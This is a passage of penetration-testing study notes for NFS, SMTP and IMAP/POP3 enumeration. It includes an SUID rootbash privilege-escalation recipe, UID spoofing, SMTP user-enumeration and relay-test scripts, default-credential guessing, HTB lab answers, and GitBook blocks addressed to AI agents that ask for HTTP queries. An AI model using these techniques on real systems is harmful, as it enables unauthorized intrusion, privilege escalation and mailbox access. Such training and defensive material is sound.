+| **NFSv3**   | More features including variable file size and better error reporting, not fully compatible with NFSv2 clients                                                                                 |
+| **NFSv4**   | Includes Kerberos, works through firewalls, no longer requires portmappers, supports ACLs, state-based operations, performance improvements and high security. First stateful protocol version |
+| **NFSv4.1** | Protocol support for cluster server deployments, scalable parallel access (pNFS extension), session trunking/NFS multipathing                                                                  |
+
+**NFSv4 Advantages:**
+
+* Only uses one port (2049) - simplifies firewall configuration
+* Stateful protocol
+* Better security features
+* Kerberos authentication support
+
+## Default Configuration
+
+NFS configuration is managed through the `/etc/exports` file, which contains a table of physical filesystems accessible by clients.
+
+**Example /etc/exports:**
+
+```bash wrap
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+```
+
+## NFS Configuration Options
+
+| Option             | Description                                            |
+| ------------------ | ------------------------------------------------------ |
+| `rw`               | Read and write permissions                             |
+| `ro`               | Read only permissions                                  |
+| `sync`             | Synchronous data transfer (slower but safer)           |
+| `async`            | Asynchronous data transfer (faster but less safe)      |
+| `secure`           | Ports above 1024 will not be used                      |
+| `insecure`         | Ports above 1024 will be used                          |
+| `no_subtree_check` | Disables subdirectory tree checking                    |
+| `root_squash`      | Maps root UID/GID 0 to anonymous, prevents root access |
+| `no_root_squash`   | All files created by root keep UID/GID 0               |
+| `nohide`           | Exports mounted subdirectories with their own entries  |
+
+## Dangerous Settings
+
+⚠️ **High-Risk Configurations:**
+
+| Option           | Risk Level | Description                                    |
+| ---------------- | ---------- | ---------------------------------------------- |
+| `rw`             | High       | Allows write access to shares                  |
+| `insecure`       | High       | Allows ports above 1024 (non-root ports)       |
+| `no_root_squash` | Critical   | Preserves root privileges - allows root access |
+| `nohide`         | Medium     | Exports mounted subdirectories separately      |
+
+## Enumeration Techniques
+
+### 1. Port Scanning
+
+```bash wrap
+# Scan essential NFS ports
+nmap -p111,2049 -sV -sC <target>
+
+# Comprehensive NFS scan
+nmap -p- --script nfs* <target> -sV
+```
+
+### 2. RPC Information Gathering
+
+```bash wrap
+# Get RPC service information
+nmap -p111 --script rpcinfo <target>
+
+# Alternative RPC enumeration
+rpcinfo -p <target>
+```
+
+### 3. NFS-Specific Enumeration
+
+```bash wrap
+# Discover NFS shares
+showmount -e <target>
+
+# Use Nmap NFS scripts
+nmap --script nfs-ls,nfs-showmount,nfs-statfs <target> -p2049
+```
+
+### 4. NFS Share Mounting
+
+```bash wrap
+# Create mount point
+mkdir /mnt/nfs-share
+
+# Mount NFS share
+mount -t nfs <target>:/path/to/share /mnt/nfs-share -o nolock
+
+# Alternative mounting options
+mount -t nfs <target>:/path/to/share /mnt/nfs-share -o nolock,vers=3
+```
+
+### 5. Content Analysis
+
+```bash wrap
+# List contents with permissions
+ls -la /mnt/nfs-share/
+
+# List with numeric UIDs/GIDs
+ls -n /mnt/nfs-share/
+
+# Check file ownership and permissions
+stat /mnt/nfs-share/filename
+```
+
+## Advanced Enumeration
+
+### Using Nmap NSE Scripts
+
+```bash wrap
+# Comprehensive NFS enumeration
+nmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 <target>
+
+# NFS vulnerability scanning
+nmap --script nfs* -p2049 <target>
+```
+
+### Manual RPC Enumeration
+
+```bash wrap
+# Query RPC services
+rpcinfo -p <target>
+
+# Specific service queries
+rpcinfo -u <target> nfs
+rpcinfo -t <target> nfs
+```
+
+## Security Issues and Attack Vectors
+
+### 1. Authentication Bypass
+
+* **Issue**: NFS relies on UID/GID mapping without proper authentication
+* **Impact**: Access to files based on numeric user IDs
+* **Exploitation**: Create local users with matching UIDs
+
+### 2. Privilege Escalation
+
+* **Issue**: `no_root_squash` configuration preserves root privileges
+* **Impact**: Root access to NFS shares
+* **Exploitation**: Upload SUID binaries, access sensitive files
+
+### 3. Information Disclosure
+
+* **Issue**: World-readable shares or misconfigured permissions
+* **Impact**: Unauthorized access to sensitive data
+* **Exploitation**: Mount shares and browse contents
+
+### 4. File System Manipulation
+
+* **Issue**: Write permissions on critical directories
+* **Impact**: Modify system files, plant backdoors
+* **Exploitation**: Upload malicious files, modify configurations
+
+## Exploitation Examples
+
+### UID/GID Manipulation
+
+```bash wrap
+# Check file ownership
+ls -n /mnt/nfs-share/
+
+# Create local user with matching UID
+useradd -u 1000 nfsuser
+
+# Switch to created user
+su nfsuser
+
+# Access files with proper permissions
+cat /mnt/nfs-share/sensitive-file.txt
+```
+
+### SUID Binary Upload (when no\_root\_squash is set)
+
+```bash wrap
+# Create SUID binary
+cp /bin/bash /mnt/nfs-share/rootbash
+chmod +s /mnt/nfs-share/rootbash
+
+# Execute from target system
+./rootbash -p
+```
+
+## Enumeration Checklist
+
+### Initial Discovery
+
+* [ ] Port scan for 111 and 2049
+* [ ] RPC service enumeration
+* [ ] NFS version identification
+* [ ] Share discovery with showmount
+
+### Share Analysis
+
+* [ ] Mount accessible shares
+* [ ] Check file permissions and ownership
+* [ ] Identify sensitive files
+* [ ] Test write permissions
+* [ ] Check for SUID/SGID binaries
+
+### Security Assessment
+
+* [ ] Verify authentication mechanisms
+* [ ] Check for no\_root\_squash setting
+* [ ] Test UID/GID manipulation
+* [ ] Assess file system permissions
+* [ ] Document configuration weaknesses
+
+## Defensive Measures
+
+### Secure Configuration
+
+```bash wrap
+# Example secure exports entry
+/secure/share 192.168.1.0/24(ro,sync,no_subtree_check,root_squash,secure)
+```
+
+### Best Practices
+
+1. **Use root\_squash**: Always enable root squashing
+2. **Restrict networks**: Limit access to specific subnets
+3. **Read-only when possible**: Use ro for shares that don't need write access
+4. **Use secure option**: Prevent use of high-numbered ports
+5. **Enable sync**: Use synchronous writes for data integrity
+6. **Regular audits**: Monitor NFS configurations and access logs
+
+### Monitoring
+
+```bash wrap
+# Check current NFS connections
+netstat -an | grep :2049
+
+# Monitor NFS statistics
+nfsstat -s
+
+# Check mounted shares
+df -t nfs
+```
+
+## Cleanup
+
+```bash wrap
+# Unmount NFS share
+umount /mnt/nfs-share
+
+# Remove mount point
+rmdir /mnt/nfs-share
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/nfs-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## SMTP Enumeration
+
+## Overview
+
+Simple Mail Transfer Protocol (SMTP) is a communication protocol for electronic mail transmission. SMTP is an application layer protocol that enables the sending of email messages between servers and clients. During enumeration, SMTP servers can reveal valuable information about the system and valid user accounts.
+
+**Key Characteristics:**
+
+* **Port 25**: Standard SMTP port
+* **Port 587**: SMTP submission port (often with STARTTLS)
+* **Port 465**: SMTP over SSL/TLS (deprecated but still used)
+* **Protocol**: Text-based, human-readable commands
+* **Authentication**: Optional, varies by configuration
+
+**SMTP Process Flow:**
+
+```
+Client (MUA) → Submission Agent (MSA) → Open Relay (MTA) → Mail Delivery Agent (MDA) → Mailbox (POP3/IMAP)
+```
+
+## SMTP Commands and Responses
+
+### Common SMTP Commands
+
+```bash wrap
+# Basic SMTP commands
+HELO/EHLO    # Identify client to server (EHLO for Extended SMTP)
+MAIL FROM    # Specify sender
+RCPT TO      # Specify recipient
+DATA         # Begin message content
+QUIT         # Close connection
+VRFY         # Verify user exists
+EXPN         # Expand mailing list
+AUTH PLAIN   # Authentication (with ESMTP)
+RSET         # Reset connection
+NOOP         # No operation (prevent timeout)
+```
+
+### User Enumeration Commands
+
+```bash wrap
+# VRFY - Verify if user exists
+VRFY username
+
+# EXPN - Expand mailing list
+EXPN listname
+
+# RCPT TO - Recipient verification
+RCPT TO:username@domain.com
+```
+
+## Default Configuration
+
+SMTP servers like Postfix can be configured in various ways. Understanding common configurations helps identify potential security issues.
+
+### Example Postfix Configuration
+
+```bash wrap
+# View Postfix main configuration
+cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
+
+# Key configuration parameters:
+smtpd_banner = ESMTP Server 
+myhostname = mail1.inlanefreight.htb
+mydestination = $myhostname, localhost 
+mynetworks = 127.0.0.0/8 10.129.0.0/16
+mailbox_size_limit = 0
+recipient_delimiter = +
+smtp_bind_address = 0.0.0.0
+inet_protocols = ipv4
+```
+
+## Dangerous Settings
+
+### Open Relay Configuration
+
+The most dangerous SMTP misconfiguration is an open relay, which allows anyone to send emails through the server:
+
+```bash wrap
+# DANGEROUS: Allows any IP to relay mail
+mynetworks = 0.0.0.0/0
+
+# SECURE: Only allow local networks
+mynetworks = 127.0.0.0/8 10.129.0.0/16
+```
+
+**Open Relay Impact:**
+
+* Spam distribution
+* Reputation damage
+* Potential for email spoofing
+* Resource abuse
+
+## Enumeration Techniques
+
+### 1. Banner Grabbing and Initial Connection
+
+```bash wrap
+# Telnet connection to grab banner
+telnet target 25
+
+# Netcat for banner grabbing
+nc target 25
+
+# Nmap banner grabbing
+nmap -p25 --script smtp-commands target
+```
+
+### 2. SMTP Service Detection
+
+```bash wrap
+# Nmap service detection
+nmap -p25,587,465 -sV -sC target
+
+# Comprehensive SMTP enumeration
+nmap -p25,587,465 --script smtp-enum-users,smtp-commands,smtp-open-relay target
+```
+
+### 3. HELO vs EHLO Testing
+
+```bash wrap
+# Basic HELO command
+telnet target 25
+HELO mail1.inlanefreight.htb
+
+# Extended SMTP capabilities with EHLO
+telnet target 25
+EHLO mail1
+
+# Example EHLO response showing capabilities:
+250-mail1.inlanefreight.htb
+250-PIPELINING
+250-SIZE 10240000
+250-ETRN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250-SMTPUTF8
+250 CHUNKING
+```
+
+### 4. User Enumeration with VRFY
+
+```bash wrap
+# Manual VRFY testing
+telnet target 25
+VRFY root
+VRFY admin
+VRFY test
+
+# Example session
+$ telnet target 25
+220 ESMTP Server
+VRFY root
+252 2.0.0 root    # User might exist
+VRFY admin
+550 admin... User unknown
+VRFY cry0l1t3
+252 2.0.0 cry0l1t3   # User might exist
+
+# Note: Some servers return 252 for all users to prevent enumeration
+```
+
+### 5. User Enumeration with EXPN
+
+```bash wrap
+# Manual EXPN testing
+telnet target 25
+EXPN root
+EXPN admin
+
+# Example responses
+250 root <root@mailserver>
+550 admin... User unknown
+```
+
+### 6. Email Sending Testing
+
+```bash wrap
+# Complete email sending session
+telnet target 25
+EHLO inlanefreight.htb
+MAIL FROM: <attacker@inlanefreight.htb>
+RCPT TO: <target@inlanefreight.htb> NOTIFY=success,failure
+DATA
+From: <attacker@inlanefreight.htb>
+To: <target@inlanefreight.htb>
+Subject: Test Email
+Date: Tue, 28 Sept 2021 16:32:51 +0200
+
+This is a test email.
+.
+QUIT
+```
+
+### 5. Automated User Enumeration
+
+```bash wrap
+# Using smtp-user-enum
+smtp-user-enum -M VRFY -U userlist.txt -t target
+smtp-user-enum -M EXPN -U userlist.txt -t target
+smtp-user-enum -M RCPT -U userlist.txt -t target
+
+# With options
+smtp-user-enum -M VRFY -U userlist.txt -t target -m 60 -w 20
+```
+
+## Advanced Enumeration
+
+### Using Nmap NSE Scripts
+
+```bash wrap
+# SMTP user enumeration
+nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} target
+
+# SMTP command enumeration
+nmap -p25 --script smtp-commands target
+
+# SMTP open relay test
+nmap -p25 --script smtp-open-relay target
+
+# SMTP brute force
+nmap -p25 --script smtp-brute target
+```
+
+### Open Relay Testing
+
+```bash wrap
+# Test for open relay with Nmap
+nmap -p25 --script smtp-open-relay -v target
+
+# Example of comprehensive relay testing (16 different tests)
+# The script tests various relay methods:
+# - MAIL FROM:<> -> RCPT TO:<relaytest@external.com>
+# - MAIL FROM:<user@target> -> RCPT TO:<relaytest@external.com>
+# - MAIL FROM:<user@target> -> RCPT TO:<relaytest%external.com@target>
+# - And many more combinations
+
+# Manual relay testing
+telnet target 25
+EHLO test.com
+MAIL FROM: <attacker@external.com>
+RCPT TO: <victim@external.com>
+DATA
+Subject: Relay Test
+This is a relay test
+.
+QUIT
+```
+
+### Manual Testing Session
+
+```bash wrap
+# Complete manual enumeration
+telnet target 25
+EHLO test.com
+HELP
+VRFY root
+VRFY admin
+EXPN root
+QUIT
+```
+
+## Security Issues and Attack Vectors
+
+### 1. User Enumeration
+
+* **Issue**: VRFY and EXPN commands reveal valid users
+* **Impact**: Username harvesting for brute force attacks
+* **Detection**: Different responses for valid vs invalid users
+* **Note**: Some servers return 252 for all users to prevent enumeration
+
+### 2. Open Relay
+
+* **Issue**: Server allows relay of mail from any source
+* **Impact**: Spam distribution, reputation damage, email spoofing
+* **Testing**: Attempt to send mail through server to external addresses
+* **Configuration**: `mynetworks = 0.0.0.0/0` creates open relay
+
+### 3. Information Disclosure
+
+* **Issue**: Verbose error messages and banners
+* **Impact**: System information, software versions
+* **Examples**: Server version, internal hostnames, configuration details
+* **Mitigation**: Use generic banners
+
+### 4. Authentication Bypass
+
+* **Issue**: Weak or missing authentication
+* **Impact**: Unauthorized mail sending
+* **Testing**: Attempt unauthenticated mail sending
+
+### 5. Email Spoofing
+
+* **Issue**: Lack of SPF/DKIM/DMARC validation
+* **Impact**: Phishing attacks, reputation damage
+* **Testing**: Send emails with forged sender addresses
+
+## Practical Examples
+
+### HTB Academy Style Enumeration
+
+```bash wrap
+# Step 1: Banner grabbing and version detection
+telnet target 25
+# Look for banner like: "220 InFreight ESMTP v2.11"
+
+# Step 2: Capability enumeration
+telnet target 25
+EHLO test.com
+# Look for supported features
+
+# Step 3: User enumeration with wordlist
+smtp-user-enum -M VRFY -U /path/to/wordlist.txt -t target -m 60 -w 20
+# Look for: "target: username exists"
+
+# Step 4: Verify findings
+telnet target 25
+VRFY discovered_user
+# Confirm user exists
+```
+
+### HTB Academy Lab Questions Examples
+
+```bash wrap
+# Question 1: "Enumerate the SMTP service and submit the banner"
+telnet target 25
+# Extract banner: "220 InFreight ESMTP v2.11"
+# Answer: InFreight ESMTP v2.11
+
+# Question 2: "Find the username that exists on the system"
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t target
+# Look for successful enumeration
+telnet target 25
+VRFY discovered_username
+# Answer: discovered_username
+```
+
+### Wordlist-based User Enumeration
+
+```bash wrap
+# Create custom wordlist
+cat > smtp_users.txt << EOF
+admin
+administrator
+root
+test
+guest
+mail
+postmaster
+webmaster
+EOF
+
+# Run enumeration
+smtp-user-enum -M VRFY -U smtp_users.txt -t target
+```
+
+## Enumeration Checklist
+
+### Initial Discovery
+
+* [ ] Port scan for 25, 587, 465
+* [ ] Banner grabbing and version identification
+* [ ] EHLO/HELO command testing
+* [ ] Available command enumeration
+
+### User Enumeration
+
+* [ ] VRFY command testing
+* [ ] EXPN command testing
+* [ ] RCPT TO method testing
+* [ ] Automated user enumeration with wordlists
+
+### Security Testing
+
+* [ ] Open relay testing
+* [ ] Authentication bypass attempts
+* [ ] Information disclosure assessment
+* [ ] Error message analysis
+
+## Tools and Techniques
+
+### Essential SMTP Tools
+
+```bash wrap
+# Manual testing
+telnet               # Basic SMTP interaction
+nc                   # Banner grabbing
+
+# Automated enumeration
+smtp-user-enum       # User enumeration tool
+nmap                 # Service detection and scripts
+
+# Specialized tools
+swaks                # SMTP testing toolkit
+sendemail            # Command-line email sending
+```
+
+### Custom Scripts
+
+```bash wrap
+# Simple SMTP user checker
+#!/bin/bash
+target=$1
+userlist=$2
+
+while read user; do
+    echo "VRFY $user" | nc $target 25 | grep -E "(250|252)"
+done < $userlist
+
+# SMTP banner grabber
+#!/bin/bash
+echo "QUIT" | nc $1 25 | head -1
+```
+
+## Defensive Measures
+
+### Secure SMTP Configuration
+
+```bash wrap
+# Disable VRFY and EXPN
+# In postfix main.cf:
+disable_vrfy_command = yes
+smtpd_discard_ehlo_keyword_address_maps = hash:/etc/postfix/discard_ehlo
+
+# In sendmail.mc:
+define(`confPRIVACY_FLAGS', `authwarnings,novrfy,noexpn,restrictqrun')
+```
+
+### Best Practices
+
+1. **Disable VRFY/EXPN**: Prevent user enumeration
+2. **Custom banners**: Hide version information
+3. **Rate limiting**: Prevent brute force attacks
+4. **Authentication**: Require authentication for mail sending
+5. **Monitoring**: Log and monitor SMTP activities
+
+### Detection and Monitoring
+
+```bash wrap
+# Monitor SMTP logs
+tail -f /var/log/maillog
+
+# Check for enumeration attempts
+grep -i "vrfy\|expn" /var/log/maillog
+grep "User unknown" /var/log/maillog
+```
+
+## Common Vulnerabilities
+
+### CVE Examples
+
+* **CVE-2020-7247**: OpenSMTPD remote code execution
+* **CVE-2016-10009**: Postfix denial of service
+* **CVE-2014-3956**: Exim privilege escalation
+
+### Mitigation Strategies
+
+1. **Keep updated**: Regular security patches
+2. **Minimal configuration**: Disable unnecessary features
+3. **Access controls**: Restrict SMTP access
+4. **Encryption**: Use TLS for mail transmission
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/smtp-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Email Services (IMAP/POP3)
+
+## Overview
+
+IMAP and POP3 are email retrieval protocols that allow clients to access email messages stored on mail servers. During enumeration, these services can reveal valuable information about the organization, system configuration, and potentially provide access to email data.
+
+**Key Characteristics:**
+
+* **POP3**: Port 110 (plain), 995 (SSL/TLS)
+* **IMAP**: Port 143 (plain), 993 (SSL/TLS)
+* **Protocol**: Text-based commands
+* **Authentication**: Username/password based
+* **Encryption**: STARTTLS or SSL/TLS
+
+## IMAP vs POP3 Differences
+
+| Feature                 | IMAP                                  | POP3                                   |
+| ----------------------- | ------------------------------------- | -------------------------------------- |
+| **Email Storage**       | Server-side (emails remain on server) | Client-side (downloads to local)       |
+| **Multi-device Access** | Yes (synchronization across devices)  | Limited (downloads remove from server) |
+| **Folder Management**   | Yes (hierarchical mailboxes)          | No (single inbox only)                 |
+| **Offline Access**      | Limited (requires sync)               | Full (emails downloaded locally)       |
+| **Server Storage**      | Higher (emails stored on server)      | Lower (emails removed after download)  |
+| **Functionality**       | Advanced (search, flags, folders)     | Basic (list, retrieve, delete)         |
+| **Typical Usage**       | Modern email clients, webmail         | Legacy systems, simple clients         |
+
+## Port Overview
+
+| Service   | Port | Description                                   |
+| --------- | ---- | --------------------------------------------- |
+| **POP3**  | 110  | Post Office Protocol v3 (plain text)          |
+| **POP3S** | 995  | POP3 over SSL/TLS                             |
+| **IMAP**  | 143  | Internet Message Access Protocol (plain text) |
+| **IMAPS** | 993  | IMAP over SSL/TLS                             |
+
+## Protocol Commands
+
+### IMAP Commands
+
+| Command                         | Description                                              |
+| ------------------------------- | -------------------------------------------------------- |
+| `1 LOGIN username password`     | User's login                                             |
+| `1 LIST "" *`                   | Lists all directories                                    |
+| `1 CREATE "INBOX"`              | Creates a mailbox with specified name                    |
+| `1 DELETE "INBOX"`              | Deletes a mailbox                                        |
+| `1 RENAME "ToRead" "Important"` | Renames a mailbox                                        |
+| `1 LSUB "" *`                   | Returns subset of names from active/subscribed mailboxes |
+| `1 SELECT INBOX`                | Selects a mailbox for message access                     |
+| `1 UNSELECT INBOX`              | Exits the selected mailbox                               |
+| `1 FETCH <ID> all`              | Retrieves data associated with a message                 |
+| `1 CLOSE`                       | Removes all messages with Deleted flag set               |
+| `1 LOGOUT`                      | Closes connection with IMAP server                       |
+
+### POP3 Commands
+
+| Command         | Description                                      |
+| --------------- | ------------------------------------------------ |
+| `USER username` | Identifies the user                              |
+| `PASS password` | Authentication of the user using password        |
+| `STAT`          | Requests number of saved emails from server      |
+| `LIST`          | Requests number and size of all emails           |
+| `RETR id`       | Requests server to deliver requested email by ID |
+| `DELE id`       | Requests server to delete requested email by ID  |
+| `CAPA`          | Requests server to display server capabilities   |
+| `RSET`          | Requests server to reset transmitted information |
+| `QUIT`          | Closes connection with POP3 server               |
+
+## Dangerous Settings
+
+IMAP/POP3 servers like Dovecot can be misconfigured, potentially exposing sensitive information:
+
+| Setting                   | Description                                           | Risk Level |
+| ------------------------- | ----------------------------------------------------- | ---------- |
+| `auth_debug`              | Enables all authentication debug logging              | High       |
+| `auth_debug_passwords`    | Logs submitted passwords and schemes                  | Critical   |
+| `auth_verbose`            | Logs unsuccessful authentication attempts and reasons | Medium     |
+| `auth_verbose_passwords`  | Passwords used for authentication are logged          | Critical   |
+| `auth_anonymous_username` | Username for ANONYMOUS SASL mechanism                 | Medium     |
+
+## Enumeration Techniques
+
+### 1. Service Detection
+
+```bash wrap
+# Nmap service detection
+nmap -p110,143,993,995 -sV -sC target
+
+# Comprehensive mail server enumeration
+nmap -p110,143,993,995 --script imap-capabilities,pop3-capabilities target
+```
+
+### 2. Banner Grabbing
+
+```bash wrap
+# POP3 banner grabbing
+telnet target 110
+nc target 110
+
+# IMAP banner grabbing
+telnet target 143
+nc target 143
+```
+
+### 3. SSL Certificate Analysis
+
+```bash wrap
+# Connect to IMAPS and analyze certificate
+openssl s_client -connect target:993
+
+# Connect to POP3S and analyze certificate
+openssl s_client -connect target:995
+
+# Show certificate details
+openssl s_client -connect target:993 -showcerts
+
+# Extract certificate information
+openssl s_client -connect target:993 < /dev/null 2>/dev/null | openssl x509 -text
+```
+
+### 4. Service Capabilities
+
+```bash wrap
+# IMAP capability enumeration
+telnet target 143
+CAPABILITY
+
+# POP3 capability enumeration
+telnet target 110
+CAPA
+```
+
+## Advanced Enumeration
+
+### Using OpenSSL for Encrypted Connections
+
+```bash wrap
+# Connect to IMAPS
+openssl s_client -connect target:993
+# Look for flags in server response: HTB{...}
+
+# Connect to POP3S
+openssl s_client -connect target:995
+# Extract server information
+
+# Connect with specific TLS version
+openssl s_client -connect target:993 -tls1_2
+```
+
+### Using cURL for IMAP/POP3 Testing
+
+```bash wrap
+# Basic IMAP connection with cURL
+curl -k 'imaps://target' --user user:password
+
+# IMAP with verbose output to see TLS details
+curl -k 'imaps://target' --user cry0l1t3:1234 -v
+
+# List IMAP folders
+curl -k 'imaps://target' --user username:password -X 'LIST "" "*"'
+
+# POP3 connection
+curl -k 'pop3s://target' --user username:password
+
+# POP3 with verbose output
+curl -k 'pop3s://target' --user username:password -v
+```
+
+**Example cURL Verbose Output Analysis:**
+
+```bash wrap
+# cURL -v provides detailed TLS and protocol information:
+curl -k 'imaps://target' --user cry0l1t3:1234 -v
+
+# Key information extracted:
+# * TLS version: TLSv1.3 / TLS_AES_256_GCM_SHA384
+# * Certificate details:
+#   subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; 
+#           CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
+# * Server banner: * OK [CAPABILITY...] HTB-Academy IMAP4 v.0.21.4
+# * Available folders: Important, INBOX
+```
+
+### SSL Certificate Information Extraction
+
+```bash wrap
+# Extract organization information
+openssl s_client -connect target:993 2>/dev/null | grep -E "subject|issuer|commonName|organizationName"
+
+# Example output analysis:
+# Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd
+# organizationName=InlaneFreight Ltd
+# commonName=dev.inlanefreight.htb
+```
+
+### Authentication Testing
+
+```bash wrap
+# IMAP authentication
+openssl s_client -connect target:993
+tag0 LOGIN username password
+
+# POP3 authentication
+openssl s_client -connect target:995
+USER username
+PASS password
+```
+
+## IMAP Enumeration
+
+### Basic IMAP Commands
+
+```bash wrap
+# Common IMAP commands
+CAPABILITY          # List server capabilities
+LOGIN user pass     # Authenticate user
+LIST "" "*"         # List all folders
+SELECT folder       # Select folder
+FETCH n (BODY[])    # Fetch message body
+LOGOUT             # Disconnect
+```
+
+### IMAP Enumeration Session
+
+```bash wrap
+# Connect to IMAPS
+openssl s_client -connect target:993
+
+# Authentication
+tag0 LOGIN username password
+
+# List folders
+tag1 LIST "" "*"
+
+# Select INBOX
+tag2 SELECT "INBOX"
+
+# Fetch first message
+tag3 FETCH 1 (BODY[])
+```
+
+## POP3 Enumeration
+
+### Basic POP3 Commands
+
+```bash wrap
+# Common POP3 commands
+USER username       # Specify username
+PASS password       # Specify password
+LIST               # List messages
+RETR n             # Retrieve message n
+DELE n             # Delete message n
+QUIT               # Disconnect
+```
+
+### POP3 Enumeration Session
+
+```bash wrap
+# Connect to POP3S
+openssl s_client -connect target:995
+
+# Authentication
+USER username
+PASS password
+
+# List messages
+LIST
+
+# Retrieve first message
+RETR 1
+```
+
+## Information Gathering
+
+### SSL Certificate Analysis
+
+```bash wrap
+# Extract useful information from certificates
+openssl s_client -connect target:993 2>/dev/null | grep -E "commonName|organizationName|stateOrProvinceName|countryName"
+
+# Common certificate fields to analyze:
+# - commonName: Server FQDN
+# - organizationName: Company name
+# - stateOrProvinceName: Location
+# - countryName: Country code
+```
+
+### Email Header Analysis
+
+```bash wrap
+# After connecting and authenticating, analyze email headers
+tag3 FETCH 1 (BODY[HEADER])
+
+# Look for:
+# - Internal IP addresses
+# - Server names
+# - Email addresses
+# - Routing information
+```
+
+## Practical Examples
+
+### HTB Academy Style Enumeration
+
+```bash wrap
+# Step 1: Service detection
+nmap -p110,143,993,995 -sV -sC target
+
+# Step 2: SSL certificate analysis
+openssl s_client -connect target:993
+# Extract: organizationName=InlaneFreight Ltd
+# Extract: commonName=dev.inlanefreight.htb
+
+# Step 3: Authentication with found credentials
+openssl s_client -connect target:993
+tag0 LOGIN robin robin
+
+# Step 4: Folder enumeration
+tag1 LIST "" "*"
+
+# Step 5: Email content analysis
+tag2 SELECT "INBOX"
+tag3 FETCH 1 (BODY[])
+```
+
+### HTB Academy Lab Questions Examples
+
+```bash wrap
+# Question 1: "Figure out the exact organization name from the IMAP/POP3 service"
+nmap -p110,143,993,995 -sV -sC target
+# Look at SSL certificate in output:
+# Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight
+# Answer: Inlanefreight
+
+# Question 2: "What is the FQDN that the IMAP and POP3 servers are assigned to?"
+# From same SSL certificate:
+# commonName=mail1.inlanefreight.htb
+# Answer: mail1.inlanefreight.htb
+
+# Question 3: "Enumerate the IMAP service and submit the flag"
+openssl s_client -connect target:993
+# Look for banner: * OK [CAPABILITY...] HTB-Academy IMAP4 v.0.21.4
+# Extract flag from banner: HTB{...}
+
+# Question 4: "What is the customized version of the POP3 server?"
+openssl s_client -connect target:995
+# Look for banner: +OK HTB-Academy POP3 Server
+# Answer: HTB-Academy POP3 Server
+
+# Question 5: "What is the admin email address?"
+# From SSL certificate subject:
+# emailAddress=cry0l1t3@inlanefreight.htb
+# Answer: cry0l1t3@inlanefreight.htb
+
+# Question 6: "Try to access the emails on the IMAP server and submit the flag"
+openssl s_client -connect target:993
+tag0 LOGIN robin robin
+tag1 LIST "" "*"
+tag2 SELECT "INBOX"
+tag3 FETCH 1 (BODY[])
+# Look for flag in email content: HTB{...}
+```
+
+### Custom Version Detection
+
+```bash wrap
+# Connect to POP3 and grab custom version
+telnet target 110
+# Look for: +OK InFreight POP3 v9.188
+
+# Connect to IMAP and grab custom version
+telnet target 143
+# Look for custom banners and capabilities
+```
+
+### Certificate Information Extraction
+
+```bash wrap
+# Detailed certificate analysis from HTB Academy
+openssl s_client -connect target:993 2>/dev/null | grep -E "subject|issuer"
+
+# Example detailed output:
+# subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; 
+#         OU=Customer Support; CN=mail1.inlanefreight.htb; 
+#         emailAddress=cry0l1t3@inlanefreight.htb
+# 
+# Extract all useful information:
+# - Organization: Inlanefreight  
+# - FQDN: mail1.inlanefreight.htb
+# - Admin email: cry0l1t3@inlanefreight.htb
+# - Location: Sacramento, California, US
+```
+
+## Security Assessment
+
+### Common Vulnerabilities
+
+1. **Weak Authentication**: Default or weak passwords
+2. **Plaintext Transmission**: Unencrypted connections
+3. **Information Disclosure**: Verbose error messages
+4. **Certificate Issues**: Self-signed or invalid certificates
+
+### Authentication Testing
+
+```bash wrap
+# Test common credentials
+USER admin
+PASS admin
+
+USER root
+PASS root
+
+# Test with discovered usernames
+USER discovered_user
+PASS common_password
+```
+
+## Enumeration Checklist
+
+### Initial Discovery
+
+* [ ] Port scan for 110, 143, 993, 995
+* [ ] Service version detection
+* [ ] Banner grabbing
+* [ ] SSL certificate analysis
+
+### Information Gathering
+
+* [ ] Extract organization name from certificates
+* [ ] Identify server FQDN
+* [ ] Analyze custom version strings
+* [ ] Document server capabilities
+
+### Authentication Testing
+
+* [ ] Test common credential combinations
+* [ ] Use discovered usernames
+* [ ] Test for authentication bypass
+* [ ] Check for account lockout policies
+
+### Content Analysis
+
+* [ ] Enumerate email folders
+* [ ] Analyze email headers
+* [ ] Search for sensitive information
+* [ ] Document administrative contacts
+
+## Tools and Techniques
+
+### Essential Tools
+
+```bash wrap
+# Manual testing
+telnet               # Basic connection testing
